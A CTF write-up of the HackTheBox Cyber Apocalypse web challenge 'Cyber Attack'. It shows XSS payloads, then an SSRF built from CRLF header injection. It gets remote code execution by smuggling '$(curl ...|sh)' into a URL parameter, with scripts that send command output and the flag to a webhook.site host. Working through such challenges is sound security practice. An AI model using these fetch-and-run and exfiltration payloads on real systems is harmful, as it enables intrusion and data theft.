---
title: Cyber Attack
tags:
  - CTF
  - HackTheBox
  - CyberApocalypse
  - Web
  - SSRF
date: 2025-03-22T00:00:00Z
---
![](Pasted%20image%2020250321233331.png)

XSS found:

```js
perico';</script><script>alert('xss');</script><script>
perico';</script><script>document.write('<form action="/upload.php" method="POST" enctype="multipart/form-data"><input type="file" name="file"><input type="submit" value="Subir"></form>');</script><script>
```

![](Pasted%20image%2020250322192534.png)

This is not the objective of the challenge.

I've been able to perform a SSRF attack by provoking an error in the `attack_domain` to call the `attack_ip` function:

```shell
http://94.237.51.163:45863/cgi-bin/attack-domain?target=-&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%26name=%0d%0a%0d%0a
```

![](Pasted%20image%2020250323194057.png)

So now I'll try to load the content of a remote file in a webhook and pipe it to bash to send me the result of a command.

The content of the webhook:

```shell
#!/bin/bash 
curl -X POST 'https://webhook.site/<WEBHOOK_ID>' --data "cmd=$(pwd)"
```

Then what I'll append to the request to execute a curl request and get rce:

```shell
curl 'http://94.237.51.163:45863/cgi-bin/attack-domain?target=-&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%2bhttps://webhook.site/<WEBHOOK_ID>|sh)%26name=%0d%0a%0d%0a'
```

This didn't work because the ip_attack function only accepts ips:

![](Pasted%20image%2020250323210012.png)

So I'll need to set up my own server where I'll put an `index.html` containing a malicious script to send commands outputs to the webhook:.

The content of the `index.html`:

```html
#!/bin/bash 
curl -X POST 'https://webhook.site/4c227219-d9b7-4b35-8eac-cd20ceb4847a' --data "cmd=$(id)"
```

Then I opened a port in my router:

![](Pasted%20image%2020250323210158.png)

Once opened, I find out my public ip:

```shell
curl ifconfig.me 

YOUR_IP
```

Then I set up a local python server:

```shell
python3 -m http.server YOUR_ROUTER_OPENED_PORT
```

Then test the connection:

```shell
curl YOUR_IP:YOUR_ROUTER_OPENED_PORT
# Here you should see a petition in te terminal of the python server
```

Now you can modify the script to make a petition to your own server:

```shell
curl 'http://94.237.51.163:45863/cgi-bin/attack-domain?target=-&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%2bYOUR_IP:YOUR_ROUTER_OPENED_PORT|sh)%26name=%0d%0a%0d%0a'
```

![](Pasted%20image%2020250323210507.png)

Got RCE!

So now we'll enumerate the machine by changing the command inside the index.html until we get the flag:

```html
#!/bin/bash 
curl -X POST 'https://webhook.site/4c227219-d9b7-4b35-8eac-cd20ceb4847a' --data "cmd=$(ls /)"
```

![](Pasted%20image%2020250323210557.png)

```html
#!/bin/bash 
curl -X POST 'https://webhook.site/4c227219-d9b7-4b35-8eac-cd20ceb4847a' --data "cmd=$(cat /flag-g59hKWrD613Pi5T.txt)"
```

![](Pasted%20image%2020250323210630.png)
